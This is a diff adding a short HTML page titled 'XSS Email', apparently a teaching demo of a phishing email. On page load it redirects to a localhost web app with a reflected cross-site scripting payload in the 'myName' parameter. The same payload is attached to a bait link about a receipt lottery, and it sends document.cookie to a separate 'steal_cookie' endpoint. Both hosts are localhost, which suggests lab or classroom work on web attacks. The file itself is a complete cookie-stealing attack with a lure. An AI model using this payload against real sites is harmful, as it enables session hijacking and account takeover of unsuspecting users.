@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>XSS Email</title>
+</head>
+<body onload="location.href='https://localhost:9443/mango/input?myName=%3Cscript%3Evar%20xhttp%20=%20new%20XMLHttpRequest();xhttp.open(%27GET%27,%20%27https://localhost:7443/steal_cookie?data=%27%2Bdocument.cookie,%20true);xhttp.send();%3C/script%3E';">
+	您的 Email 信件...<p />
+	
+	<a href="https://localhost:9443/mango/input?myName=%3Cscript%3Evar%20xhttp%20=%20new%20XMLHttpRequest();xhttp.open(%27GET%27,%20%27https://localhost:7443/steal_cookie?data=%27%2Bdocument.cookie,%20true);xhttp.send();%3C/script%3E">
+		統一發票兌獎...
+	</a>
+</body>
+</html>
